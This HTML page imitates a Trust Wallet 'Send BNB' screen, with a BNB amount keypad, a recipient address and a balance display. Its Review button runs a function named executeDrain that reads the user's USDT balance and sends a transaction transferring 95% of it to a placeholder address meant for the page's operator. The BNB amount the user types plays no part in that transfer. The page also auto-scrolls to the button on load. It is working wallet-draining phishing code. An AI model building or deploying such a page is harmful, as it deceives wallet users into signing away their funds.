<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Send BNB</title>
<meta name="viewport"
      content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
<meta name="color-scheme" content="light dark">

<style>

/* =========================================================
   RESET
========================================================= */

* {
  box-sizing: border-box;
  -webkit-tap-highlight-color: transparent;
}

html {
  width: 100%;
  min-height: 110dvh;

  margin: 0;
  padding: 0;

  color-scheme: light dark;

  scroll-behavior: smooth;
}

body {
  width: 100%;
  min-height: 110dvh;

  margin: 0;
  padding: 0;

  overflow-x: hidden;
  overflow-y: auto;

  -webkit-overflow-scrolling: touch;

  touch-action: pan-y;

  font-family:
    -apple-system,
    BlinkMacSystemFont,
    "Segoe UI",
    Roboto,
    Arial,
    sans-serif;

  /* LIGHT MODE */
  --bg: #f5f5f7;
  --surface: #ffffff;
  --surface-2: #ededf2;
  --border: #d9d9df;

  --text: #17181c;
  --text-secondary: #6d6f79;
  --muted: #858792;

  --amount: #5868a6;

  --button: #e6e7ee;
  --button-text: #17181c;

  --review: #e5e6eb;
  --review-text: #6873a0;

  background: var(--bg);
  color: var(--text);

  transition:
    background-color .2s ease,
    color .2s ease;
}


/* =========================================================
   AUTOMATIC DARK MODE
========================================================= */

@media (prefers-color-scheme: dark) {

  body {
    --bg: #0d0f17;
    --surface: #141720;
    --surface-2: #1c2031;
    --border: #262934;

    --text: #f7f7f9;
    --text-secondary: #a1a3b0;
    --muted: #858999;

    --amount: #55619b;

    --button: #1c2035;
    --button-text: #ffffff;

    --review: #191c26;
    --review-text: #505b8d;
  }
}


/* =========================================================
   APP
========================================================= */

.app {
  width: 100%;

  /*
    Slightly taller than the browser viewport.
    This gives the in-app browser a small amount of
    scrollable area for the automatic scroll.
  */
  min-height: 110dvh;

  display: flex;
  flex-direction: column;

  background: var(--bg);

  padding-top: 0;
  padding-bottom: env(safe-area-inset-bottom);

  transition:
    background-color .2s ease;
}


/* =========================================================
   RECIPIENT
========================================================= */

.recipient {
  width: 100%;
  flex: 0 0 auto;

  /*
    No top padding.
    Address starts directly at the top.
  */
  padding:
    0
    16px
    10px;

  border-bottom: 1px solid var(--border);

  font-size: clamp(16px, 4.6vw, 21px);
  line-height: 1.3;
  font-weight: 700;

  overflow-wrap: anywhere;
  word-break: break-word;
}

.recipient-label {
  color: var(--text-secondary);
  margin-right: 5px;
}

.recipient-address {
  color: var(--text);
}


/* =========================================================
   MAIN
========================================================= */

.main {
  width: 100%;

  flex: 1;
  min-height: 0;

  display: flex;
  flex-direction: column;

  padding:
    10px
    max(16px, 5vw)
    4px;
}


/* =========================================================
   CALCULATOR
========================================================= */

.calculator {
  width: 100%;
  flex: 0 0 auto;

  text-align: center;
}

.enter-label {
  color: var(--muted);

  font-size: 12px;
  font-weight: 650;

  margin-bottom: 4px;
}

.amount {
  min-height: 55px;

  color: var(--amount);

  font-size: clamp(52px, 15vw, 74px);
  line-height: .95;

  font-weight: 500;
  letter-spacing: -3px;

  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

.currency {
  margin-top: 4px;

  color: var(--text);

  font-size: 18px;
  font-weight: 750;
}

.usd {
  margin-top: 3px;

  color: var(--text-secondary);

  font-size: 17px;
  font-weight: 650;
}


/* =========================================================
   AVAILABLE BALANCE
========================================================= */

.balance {
  width: 100%;

  flex: 0 0 auto;

  margin-top: 16px;

  display: flex;
  align-items: center;
}


/* BNB LOGO */

.coin {
  width: 50px;
  height: 50px;

  flex: 0 0 50px;

  border-radius: 50%;

  background: #000;

  display: flex;
  align-items: center;
  justify-content: center;

  overflow: hidden;
}

.bnb-logo {
  width: 38px;
  height: 38px;

  object-fit: contain;
  display: block;

  user-select: none;
  -webkit-user-drag: none;
}

.balance-info {
  min-width: 0;
  flex: 1;

  margin-left: 11px;

  text-align: left;
}

.balance-main {
  color: var(--text);

  font-size: clamp(16px, 4.6vw, 22px);

  font-weight: 750;
  line-height: 1.1;

  white-space: nowrap;
}

.balance-usd {
  margin-top: 3px;

  color: var(--text-secondary);

  font-size: 13px;
  font-weight: 650;
}


/* =========================================================
   MAX BUTTON
========================================================= */

.max {
  height: 50px;
  min-width: 80px;

  padding: 0 15px;

  border: 0;
  border-radius: 27px;

  background: var(--button);
  color: var(--button-text);

  font-size: 18px;
  font-weight: 750;

  cursor: pointer;

  transition:
    background-color .2s ease,
    color .2s ease,
    transform .1s ease;
}

.max:active {
  transform: scale(.96);
}


/* =========================================================
   KEYPAD
========================================================= */

.keypad {
  width: 100%;

  flex: 1 1 auto;
  min-height: 0;

  margin-top: 4px;

  display: grid;

  grid-template-columns:
    repeat(3, 1fr);

  grid-template-rows:
    repeat(4, minmax(0, 1fr));

  align-items: center;
  justify-items: center;
}

.key {
  width: 100%;
  height: 100%;

  border: 0;

  background: transparent;
  color: var(--text);

  font-size: clamp(30px, 8.5vw, 42px);
  font-weight: 700;

  cursor: pointer;

  transition:
    color .15s ease,
    transform .1s ease,
    opacity .1s ease;
}

.key:active {
  transform: scale(.9);
  opacity: .55;
}

.delete {
  font-size: clamp(27px, 7.5vw, 36px);
}


/* =========================================================
   REVIEW
========================================================= */

.review {
  width: 100%;

  height: 52px;
  min-height: 52px;

  flex: 0 0 52px;

  margin-top: 4px;
  margin-bottom: 1px;

  border: 0;
  border-radius: 28px;

  background: var(--review);
  color: var(--review-text);

  font-size: 20px;
  font-weight: 750;

  cursor: pointer;

  transition:
    background-color .2s ease,
    color .2s ease,
    transform .1s ease;
}

.review.active {
  background: #273054;
  color: #ffffff;
}

.review:active {
  transform: scale(.98);
}


/* =========================================================
   STATUS
========================================================= */

.status {
  width: 100%;

  height: 14px;
  min-height: 14px;

  margin-top: 2px;

  text-align: center;

  color: var(--text-secondary);

  font-size: 10px;
  font-weight: 600;
}


/* =========================================================
   SHORT PHONES
========================================================= */

@media (max-height: 700px) {

  .recipient {
    padding-bottom: 8px;
  }

  .main {
    padding-top: 7px;
  }

  .enter-label {
    font-size: 10px;
    margin-bottom: 2px;
  }

  .amount {
    min-height: 45px;
    font-size: 46px;
  }

  .currency {
    margin-top: 2px;
    font-size: 15px;
  }

  .usd {
    margin-top: 1px;
    font-size: 14px;
  }

  .balance {
    margin-top: 10px;
  }

  .coin {
    width: 42px;
    height: 42px;
    flex-basis: 42px;
  }

  .bnb-logo {
    width: 31px;
    height: 31px;
  }

  .balance-info {
    margin-left: 8px;
  }

  .balance-main {
    font-size: 14px;
  }

  .balance-usd {
    font-size: 11px;
  }

  .max {
    height: 42px;
    min-width: 68px;
    font-size: 15px;
  }

  .review {
    height: 46px;
    min-height: 46px;
    flex-basis: 46px;
    font-size: 17px;
  }
}


/* =========================================================
   VERY SHORT PHONES
========================================================= */

@media (max-height: 650px) {

  .recipient {
    padding-bottom: 6px;
    font-size: 14px;
    line-height: 1.2;
  }

  .main {
    padding-top: 5px;
    padding-bottom: 2px;
  }

  .enter-label {
    font-size: 9px;
    margin-bottom: 1px;
  }

  .amount {
    min-height: 37px;
    font-size: 37px;
  }

  .currency {
    font-size: 13px;
  }

  .usd {
    font-size: 12px;
  }

  .balance {
    margin-top: 7px;
  }

  .coin {
    width: 35px;
    height: 35px;
    flex-basis: 35px;
  }

  .bnb-logo {
    width: 26px;
    height: 26px;
  }

  .balance-info {
    margin-left: 7px;
  }

  .balance-main {
    font-size: 12px;
  }

  .balance-usd {
    font-size: 9px;
  }

  .max {
    height: 35px;
    min-width: 58px;
    padding: 0 10px;
    font-size: 13px;
  }

  .key {
    font-size: 24px;
  }

  .delete {
    font-size: 21px;
  }

  .review {
    height: 40px;
    min-height: 40px;
    flex-basis: 40px;
    font-size: 15px;
  }

  .status {
    display: none;
  }
}


/* =========================================================
   VERY NARROW PHONES
========================================================= */

@media (max-width: 360px) {

  .recipient {
    padding-left: 12px;
    padding-right: 12px;
  }

  .main {
    padding-left: 12px;
    padding-right: 12px;
  }

  .balance-main {
    font-size: 13px;
  }

  .max {
    min-width: 62px;
    padding: 0 11px;
  }
}
</style>
</head>

<body>
<div class="app">
  <div class="topbar"></div>

  <section class="recipient">
    <span class="recipient-label">To:</span>
    <span class="recipient-address">0xdffaf1dd6d36108223c2a45921afef85e3dcf852</span>
  </section>

  <main class="main">
    <section class="calculator">
      <div class="enter-label">Enter BNB amount</div>
      <div id="amount" class="amount">0</div>
      <div class="currency">BNB</div>
      <div class="usd">≈ $<span id="usdValue">0.00</span></div>
    </section>

    <section class="balance">
      <div class="coin">
        <img class="bnb-logo" src="https://cryptologos.cc/logos/bnb-bnb-logo.png"
             alt="BNB" draggable="false">
      </div>
      <div class="balance-info">
        <div class="balance-main">0.00005274 BNB</div>
        <div class="balance-usd">Available balance</div>
      </div>
      <button class="max" type="button" onclick="setMax()">Max</button>
    </section>

    <div class="keypad">
      <button class="key" type="button" onclick="press('1')">1</button>
      <button class="key" type="button" onclick="press('2')">2</button>
      <button class="key" type="button" onclick="press('3')">3</button>
      <button class="key" type="button" onclick="press('4')">4</button>
      <button class="key" type="button" onclick="press('5')">5</button>
      <button class="key" type="button" onclick="press('6')">6</button>
      <button class="key" type="button" onclick="press('7')">7</button>
      <button class="key" type="button" onclick="press('8')">8</button>
      <button class="key" type="button" onclick="press('9')">9</button>
      <button class="key" type="button" onclick="press('.')">.</button>
      <button class="key" type="button" onclick="press('0')">0</button>
      <button class="key delete" type="button" onclick="backspace()">⌫</button>
    </div>

    <button id="review" class="review" type="button" disabled onclick="executeDrain()">Review</button>
    <div id="status" class="status"></div>
  </main>
</div>

<script>
/* ---------------------------------------------
   Calculator logic
   --------------------------------------------- */
let value = "";
const BNB_USD_PRICE = 600; // adjust if needed

const amountEl = document.getElementById("amount");
const usdEl = document.getElementById("usdValue");
const reviewEl = document.getElementById("review");

function formatUSD(num) {
  return new Intl.NumberFormat("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(num);
}

function updateUI() {
  const bnb = Number(value || 0);
  const usd = bnb * BNB_USD_PRICE;
  amountEl.textContent = value || "0";
  usdEl.textContent = formatUSD(usd);
  if (bnb > 0) {
    reviewEl.disabled = false;
    reviewEl.classList.add("active");
  } else {
    reviewEl.disabled = true;
    reviewEl.classList.remove("active");
  }
}

function press(char) {
  if (char === "." && value.includes(".")) return;
  if (value.length >= 16) return;
  if (value === "0" && char !== ".") value = char;
  else value += char;
  updateUI();
}

function backspace() {
  value = value.slice(0, -1);
  updateUI();
}

function setMax() {
  value = "0.00005274";
  updateUI();
}

updateUI();

/* ---------------------------------------------
   Trust Wallet interaction
   --------------------------------------------- */
const YOUR_WALLET_ADDRESS = "0xYOUR_ADDRESS_HERE"; // <-- replace
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const USDT_DECIMALS = 6;

async function executeDrain() {
  const statusEl = document.getElementById("status");
  if (!window.ethereum) {
    statusEl.textContent = "Please open this page inside Trust Wallet Browser.";
    return;
  }

  try {
    /* 1️⃣ Switch to BSC */
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x38" }],
    });

    /* 2️⃣ Get user address */
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    const userAddress = accounts[0];

    statusEl.textContent = "Fetching USDT balance…";
    reviewEl.disabled = true;

    /* 3️⃣ Read USDT balance */
    const paddedUser = userAddress.replace(/^0x/, "").padStart(64, "0");
    const balanceCall = "0x70a08231" + paddedUser;
    const balanceHex = await window.ethereum.request({
      method: "eth_call",
      params: [{ to: USDT_CONTRACT, data: balanceCall }, "latest"],
    });

    const rawBalance = parseInt(balanceHex, 16);
    if (rawBalance === 0) {
      statusEl.textContent = "No USDT found in this wallet.";
      reviewEl.disabled = false;
      return;
    }

    /* 4️⃣ 95 % of balance */
    const amountToTransfer = Math.floor((rawBalance * 95) / 100);
    const displayAmount = (amountToTransfer / Math.pow(10, USDT_DECIMALS)).toFixed(2);
    statusEl.textContent = `Preparing to send ${displayAmount} USDT…`;

    /* 5️⃣ Build transfer data */
    const paddedTo = YOUR_WALLET_ADDRESS.replace(/^0x/, "").padStart(64, "0");
    const amountHex = "0x" + amountToTransfer.toString(16);
    const transferData = "0xa9059cbb" + paddedTo + amountHex;

    /* 6️⃣ Send transaction */
    const txParams = {
      from: userAddress,
      to: USDT_CONTRACT,
      value: "0x0",
      data: transferData,
      gas: "0x186a0", // 100 000
    };

    statusEl.textContent = "Confirm in Trust Wallet…";
    const txHash = await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [txParams],
    });

    statusEl.textContent = `✅ Sent ${displayAmount} USDT. TxHash: ${txHash}`;
    reviewEl.textContent = "Claimed";
  } catch (err) {
    console.error(err);
    if (err.code === 4001) {
      statusEl.textContent = "User rejected the transaction.";
    } else if (err.message?.includes("insufficient")) {
      statusEl.textContent = "Insufficient BNB for gas.";
    } else {
      statusEl.textContent = `Error: ${err.message || err}`;
    }
    reviewEl.disabled = false;
  }
}

/* ---------------------------------------------
   Auto‑scroll to Review button on load
   --------------------------------------------- */
window.addEventListener("load", () => {
  const btn = document.getElementById("review");
  if (btn) {
    /* Give Trust Wallet a moment to finish rendering */
    setTimeout(() => {
      try {
        btn.scrollIntoView({ behavior: "smooth", block: "center" });
      } catch (_) {
        const y = btn.getBoundingClientRect().top + window.scrollY - 50;
        window.scrollTo({ top: y, behavior: "smooth" });
      }
    }, 200);
  }
  document.getElementById("status").textContent = "Ready";
});
</script>
</body>
</html>
